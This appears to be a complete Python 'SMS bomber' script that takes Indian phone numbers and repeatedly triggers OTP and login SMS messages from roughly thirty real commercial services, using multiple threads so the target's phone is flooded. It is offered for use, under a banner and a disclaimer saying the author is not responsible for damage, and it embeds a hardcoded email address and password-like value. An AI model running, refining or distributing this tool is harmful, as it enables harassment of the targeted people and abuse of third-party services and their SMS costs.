import os 
def detect_os():
    if os.name == 'nt':
        print("Windows OS detected")
    elif os.name == 'posix':
        if 'Darwin' in os.uname():
            print("Mac OS detected")
        else:
            print("Linux OS detected")
    else:
        print("Unknown OS detected")

detect_os()
try : 
    import requests
    from requests.structures import CaseInsensitiveDict
except : 
    os.system("pip install requests")
    
    os.system("clear")
import threading


os.system("clear")

print("""

  ____  _    _ _      _  __   _____ __  __  _____   ____   ____  __  __ ____  ______ _____  
 |  _ \| |  | | |    | |/ /  / ____|  \/  |/ ____| |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
 | |_) | |  | | |    | ' /  | (___ | \  / | (___   | |_) | |  | | \  / | |_) | |__  | |__) |
 |  _ <| |  | | |    |  <    \___ \| |\/| |\___ \  |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
 | |_) | |__| | |____| . \   ____) | |  | |____) | | |_) | |__| | |  | | |_) | |____| | \ \ 
 |____/ \____/|______|_|\_\ |_____/|_|  |_|_____/  |____/ \____/|_|  |_|____/|______|_|  \_\
     | |               /\                                    (_)             | |            
     | |__  _   _     /  \   _ __ _   _  __ _ _ __  _ __ __ _ _  ___ ___   __| | ___        
     | '_ \| | | |   / /\ \ | '__| | | |/ _` | '_ \| '__/ _` | |/ __/ _ \ / _` |/ _ \       
     | |_) | |_| |  / ____ \| |  | |_| | (_| | | | | | | (_| | | (_| (_) | (_| |  __/       
     |_.__/ \__, | /_/    \_\_|   \__, |\__,_|_| |_|_|  \__,_| |\___\___/ \__,_|\___|       
             __/ |                 __/ |                    _/ |                            
            |___/                 |___/                    |__/                             

Note : I won't be responsible for any damage caused by this script, Use at your own risk
""")
try : 
    na = (int(input("Please enter how many targets you want : ")))
except :
    print("Enter a amount in number ")
 

for i in  range(na) :
    number = input("Enter number without +91 : ")
try : 
    amount = int(input("Enter Amount to spam : "))
    th = int(input("Enter thread amount (if you dont know enter 1 ) : "))
except :
    print("Enter a amount in number ")
    
if th == 1:
    th = 2
        

def sms(number,amount) : 
    
    url1 = "https://api.penpencil.co/v1/users/resend-otp?smsType=2"
    headers1 = CaseInsensitiveDict()
    headers1["Content-Type"] = "application/json"
    data1 = '{"mobile":"'+number+'\","organizationId":"5eb393ee95fab7468a79d189"}'

    url2 = "https://identity.tllms.com/api/request_otp"
    headers2 = CaseInsensitiveDict()
    headers2["Content-Type"] = "application/json"
    data2 = '{"phone":"+91-'+number+'\","app_client_id":"90391da1-ee49-4378-bd12-1924134e906e"}'



    url3 = "https://khiladi.com/v1/exchange/user/userRegisterOtpSent"
    headers3 = CaseInsensitiveDict()
    headers3["Content-Type"] = "application/json"
    data3 = '{"mobileNo":"+91'+number+'\","userName":"LANDRLOID"}'


    url4 = "https://webrouter-bbe-prod.angelbroking.com/login/v3/generateLoginOTP"
    headers4 = CaseInsensitiveDict()
    headers4["Content-Type"] = "application/json"
    data4 = '{"country_code":"+91","is_otp_resend":false,"mob_no":"'+number+'\","user_id":""}'


    url58 = "https://seller.flipkart.com/napi/graphql"
    headers58 = CaseInsensitiveDict()
    headers58["Content-Type"] = "application/json"
    data58 = '{"operationName":"SellerOnboarding_GenerateOTPMobile","variables":{"mobileNo":"'+number+'\"},"query":"mutation SellerOnboarding_GenerateOTPMobile($mobileNo: String!) {\n  generateOTPMobile(mobileNo: $mobileNo)\n}\n"}'

    url56 = "https://mightyzeus.housing.com/api/gql?apiName=LOGIN_SEND_OTP_API&emittedFrom=client_buy_LOGIN&isBot=false&source=mobile"
    headers56 = CaseInsensitiveDict()
    headers56["Content-Type"] = "application/json"
    data56 = '{"query":"\n  mutation($email: String, $phone: String, $otpLength: Int) {\n    sendOtp(phone: $phone, email: $email, otpLength: $otpLength) {\n      success\n      message\n    }\n  }\n","variables":{"phone":"'+number+'\"}}'

    url57 = "https://www.samsung.com/in/api/v1/sso/otp/init"
    headers57 = CaseInsensitiveDict()
    headers57["Content-Type"] = "application/json"
    data57 = '{"user_id":"'+number+'\"}'

    url52 = "https://apinew.moglix.com/nodeApi/v1/login/sendOTP"
    headers52 = CaseInsensitiveDict()
    headers52["Content-Type"] = "application/json"
    data52 = '{"email":"","phone":"'+number+'\","type":"p","source":"signup","buildVersion":"24.0","device":"mobile"}'
    url32 = "https://api.nnnow.com/d/apiV2/otp/generateOtp/v1/flash"
    headers32 = CaseInsensitiveDict()
    headers32["Content-Type"] = "application/json"
    data32 = '{"mobileNumber":"'+number+'\","otpTemplateId":"5b4e2e49b70e040008ffbcbe"}'

    url33 = "https://apistaging.justmyroots.com/api/web/auth/signup"
    headers33 = CaseInsensitiveDict()
    headers33["Content-Type"] = "application/json"
    data33 = '{"phoneNumber":"91'+number+'\","firstName":"JunN","lastName":"SENA","email":"srrrajput@gmail.com","location":"India"}'
    url36 = "https://tizola.in/api/login"
    headers36 = CaseInsensitiveDict()
    headers36["Content-Type"] = "application/x-www-form-urlencoded"

    data36 = "username="+number+'\"&password=RG5%2540znmkA%254073D"'

    url37 = "https://webapi.zoopindia.com/customers/resend-otp"
    headers37 = CaseInsensitiveDict()
    headers37["Content-Type"] = "application/json"
    data37 = '{"mobile":"'+number+'\","customerId":901718}'

    url38 = "https://webapi.zoopindia.com/customers/login"
    headers38 = CaseInsensitiveDict()
    headers38["Content-Type"] = "application/json"
    data38 = '{"mobile":"'+number+'\","source":"Mobile-Web"}'
    url39 = "https://api.shadowfax.in/delivery/otp/send/"
    headers39 = CaseInsensitiveDict()
    headers39["Content-Type"] = "application/json"
    data39 = '{"mobile_number":"'+number+'\"}'


    url40 = "https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction"

    headers40 = CaseInsensitiveDict()
    headers40["Content-Type"] = "application/x-www-form-urlencoded"

    data40 = "control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName="+number+'&isAjax=true"'

    url41 = "https://www.shopsy.in/api/1/action/view"   

    headers41 = CaseInsensitiveDict()
    headers41["Content-Type"] = "application/json"

    data41 = '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"'+number+'\","clientQueryParamMap":{"ret":"/reseller-homepage-store?utm_medium=GoogleAd&utm_campaign=Google-PerfMax&cmpid=Google-PerfMax&cmpid=Google-Shopping-PerfMax2-AllProducts-India&gclid=CjwKCAjwyeujBhA5EiwA5WD7_QCLQc98rqTGftpXGqHEi1QZ_OKk7Rg76Aevk1OftIkhpIfX1rM1zxoCkL8QAvD_BwE","entryPage":"HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'


    url42 = "https://www.khelplayrummy.com/component/weaver/?task=registration.otpBasedCommonAjaxFunction"
    headers42 = CaseInsensitiveDict()
    headers42["Content-Type"] = "application/x-www-form-urlencoded"
    data42 = "control=GET_OTP&sMobileOrEmailOperation=MOBILE&sOperation=REGISTRATION&sUserName="+number+'&isAjax=true"'

    url5 = "https://unacademy.com/api/v3/user/user_check/?enable-email=true"
    headers5 = CaseInsensitiveDict()
    headers5["Content-Type"] = "application/json"
    data5 = '{"phone":"'+number+'\","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}'
    url6 = "https://khiladi.com/v1/exchange/user/userRegisterOtpSent"
    headers6 = CaseInsensitiveDict()
    headers6["Content-Type"] = "application/json"
    data6 = '{"mobileNo":"+91'+number+'\","userName":"LANDROID"}'
    url7 = "https://www.rummycircle.com/api/fl/auth/v3/getOtp"
    headers7 = CaseInsensitiveDict()
    headers7["Content-Type"] = "application/json"
    data7 = '{"mobile":"'+number+'\","deviceId":"72abdd9a-7038-41c0-a57d-d0022dac60da","deviceName":"","refCode":"","isPlaycircle":false}'
    url8 = "https://www.my11circle.com/api/fl/auth/v3/getOtp"
    headers8 = CaseInsensitiveDict()
    headers8["Content-Type"] = "application/json"
    data8 = '{"mobile":"'+number+'\","deviceId":"1aeb7fad-58d0-4887-9f77-2a469039a413","deviceName":"","refCode":"","isPlaycircle":false}'

    url10 = "https://api.spinny.com/api/c/user/otp-request/"
    headers10 = CaseInsensitiveDict()
    headers10["Content-Type"] = "application/json"
    data10 = '{"contact_number":"'+number+'\","whatsapp":false,"code_len":4}'
    url11 = "https://api.gromoinsure.com/v1/auth/sendOTP"
    headers11 = CaseInsensitiveDict()
    headers11["Content-Type"] = "application/json"
    data11 = '{"phone":"'+number+'\"}'
    url13 = "https://www.tractorjunction.com/ajax/send-otp/?mobile="+number
    url14 = "https://kukufm.com/api/v1/users/auth/send-otp/"
    headers14 = CaseInsensitiveDict()
    headers14["Content-Type"] = "application/json"
    data14 = '{"phone_number":"+91'+number+'\"}'
    url15 = "https://customer.rapido.bike/api/otp"
    headers15 = CaseInsensitiveDict()
    headers15["Content-Type"] = "application/json"
    data15 = '{"mobile":"'+number+'\"}'

    url16 = "https://loginprod.medibuddy.in/unified-login/user/register"
    headers16 = CaseInsensitiveDict()
    headers16["Content-Type"] = "application/json"
    data16 = '{"source":"medibuddyInWeb","platform":"medibuddy","phonenumber":"'+number+'\","screen":"login-page","advertiserId":"56d487a8-89b1-Lbd9-a831-c69940c6a649","mbUserId":null}'

    url49 = "https://prod.api.sugarcosmetics.com/users/prod/v2/sendOtp"
    headers49 = CaseInsensitiveDict()
    headers49["Content-Type"] = "application/json"
    data49 = '{"phone_no":"+91'+number+'\","website":true,"is_guest_checkout":false}'

    url24 = "https://www.tataplay.com/inception-pack/otp/resend-otp"
    headers24 = CaseInsensitiveDict()
    headers24["Content-Type"] = "application/json"
    data24 = '{"journeySource":"REGISTER","id":"'+number+'\"}'
   





    for j in range(amount):
        resp1 = requests.post(url1, headers=headers1, data=data1)
        print("SMS Sent")
        resp2 = requests.post(url2, headers=headers2, data=data2)
        print("SMS Sent")
        resp3 = requests.post(url3, headers=headers3, data=data3)
        print("SMS Sent")
        resp4 = requests.post(url4, headers=headers4, data=data4)
        print("SMS Sent")
        resp58 = requests.post(url58, headers=headers58, data=data58)
        print("SMS Sent")
        resp52 = requests.post(url52, headers=headers52, data=data52)
        print("SMS Sent")
        resp56 = requests.post(url56, headers=headers56, data=data56)
        print("SMS Sent")
        resp57 = requests.post(url57, headers=headers57, data=data57)
        print("SMS Sent")
        resp32 = requests.post(url32,
        headers=headers32, data=data32)
        print("SMS Sent")
        resp33 = requests.post(url33, headers=headers33, data=data33)
        print("SMS Sent")
        resp36 = requests.post(url36, headers=headers36, data=data36)
        print("SMS Sent")
        resp37 = requests.post(url37,
        headers=headers37, data=data37)
        print("SMS Sent")
        resp38 = requests.post(url38, headers=headers38, data=data38)
        print("SMS Sent")
        resp39 = requests.post(url39, headers=headers39, data=data39)
        print("SMS Sent")
        resp40 = requests.post(url40, headers=headers40, data=data40)
        print("SMS Sent")
        resp41 = requests.post(url41, headers=headers41, data=data41)
        print("SMS Sent")
        resp42 = requests.post(url42, headers=headers42, data=data42)
        print("SMS Sent")
        resp5 = requests.post(url5, headers=headers5, data=data5)
        print("SMS Sent")
        resp6 = requests.post(url6, headers=headers6, data=data6)
        print("SMS Sent")
        resp7 = requests.post(url7, headers=headers7, data=data7)
        print("SMS Sent")
        resp8 = requests.post(url8, headers=headers8, data=data8)
        print("SMS Sent")
        resp10 = requests.post(url10, headers=headers10, data=data10)
        print("SMS Sent")
        resp11 = requests.post(url11, headers=headers11, data=data11)
        print("SMS Sent")
        resp13 = requests.get(url13)
        print("SMS Sent")
        resp14 = requests.post(url14, headers=headers14, data=data14)
        print("SMS Sent")
        resp15 = requests.post(url15, headers=headers15, data=data15)
        print("SMS Sent")
        resp16 = requests.post(url16, headers=headers16, data=data16)
        print("SMS Sent")
        resp49 = requests.post(url49, headers=headers49, data=data49)
        print("SMS Sent")
        resp24 = requests.post(url24, headers=headers24, data=data24)
        print("SMS Sent")
        resp15 = requests.post(url15, headers=headers15, data=data15)
        print("SMS Sent")
        resp16 = requests.post(url16, headers=headers16, data=data16)
        print("SMS Sent")
        resp49 = requests.post(url49, headers=headers49, data=data49)
        print("SMS Sent")
        resp24 = requests.post(url24, headers=headers24, data=data24)
        print("SMS Sent")
    
        resp14 = requests.post(url14, headers=headers14, data=data14)
        print("SMS Sent")
        resp15 = requests.post(url15, headers=headers15, data=data15)
        print("SMS Sent")
        resp16 = requests.post(url16, headers=headers16, data=data16)
        print(str(j+1)+"Sms sent")

    

    


threads = []

# Start the threads
for _ in range(th):
    thread = threading.Thread(target=sms, args=(number, amount))
    thread.start()
    threads.append(thread)

for thread in threads:
    thread.join()
    print("Completed")
